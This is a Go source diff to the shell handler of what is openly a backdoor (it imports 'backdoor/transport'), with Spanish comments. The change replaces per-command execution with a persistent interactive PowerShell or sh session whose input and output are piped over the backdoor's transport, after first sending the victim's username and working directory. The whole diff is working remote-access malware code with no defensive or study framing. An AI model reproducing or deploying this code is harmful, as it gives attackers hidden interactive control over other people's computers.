@@ -2,60 +2,66 @@ package handler
 
 import (
 	"backdoor/transport"
-	"bytes"
+	"bufio"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
-	"strings"
+	"runtime"
 )
 
 func ShellHandler(t transport.Transport) {
 	username := os.Getenv("USERNAME")
 	if username == "" {
-		username = os.Getenv("USER") // Linux/macOS fallback
+		username = os.Getenv("USER")
 	}
 
 	cwd, _ := os.Getwd()
-
 	header := fmt.Sprintf("[*] Usuario: %s\n[*] Directorio: %s\n", username, cwd)
 	t.Write([]byte(header))
 
-	t.Write([]byte("Shell activa. Escribe comandos:\n"))
+	var shell *exec.Cmd
+	if runtime.GOOS == "windows" {
+		shell = exec.Command("powershell.exe", "-NoLogo")
+	} else {
+		shell = exec.Command("sh")
+	}
 
+	stdin, _ := shell.StdinPipe()
+	stdout, _ := shell.StdoutPipe()
+	stderr, _ := shell.StderrPipe()
+
+	err := shell.Start()
+	if err != nil {
+		t.Write([]byte(fmt.Sprintf("Error iniciando shell: %v\n", err)))
+		return
+	}
+
+	// Lee la salida del proceso
+	go func() {
+		reader := bufio.NewReader(io.MultiReader(stdout, stderr))
+		buf := make([]byte, 1024)
+		for {
+			n, err := reader.Read(buf)
+			if err != nil {
+				break
+			}
+			if n > 0 {
+				t.Write(buf[:n])
+			}
+		}
+	}()
+
+	// Envía comandos al stdin
 	for {
-		cwd, _ = os.Getwd()
-		prompt := fmt.Sprintf("[%s]> ", cwd)
-		t.Write([]byte(prompt))
-
 		input, err := t.Read()
 		if err != nil {
-			return
-		}
-
-		cmd := strings.TrimSpace(string(input))
-		if cmd == "exit" {
-			t.Write([]byte("Saliendo de shell\n"))
 			break
 		}
-
-		parts := strings.Split(cmd, " ")
-		if parts[0] == "cd" && len(parts) > 1 {
-			err := os.Chdir(parts[1])
-			if err != nil {
-				t.Write([]byte("Error cambiando directorio\n"))
-			}
-			continue
+		if string(input) == "exit\n" || string(input) == "exit\r\n" {
+			stdin.Write([]byte("exit\n"))
+			break
 		}
-
-		var out bytes.Buffer
-		command := exec.Command("cmd", "/C", cmd)
-		if os.Getenv("SHELL") != "" { // Si no estás en Windows
-			command = exec.Command("sh", "-c", cmd)
-		}
-
-		command.Stdout = &out
-		command.Stderr = &out
-		command.Run()
-		t.Write(out.Bytes())
+		stdin.Write(input)
 	}
 }
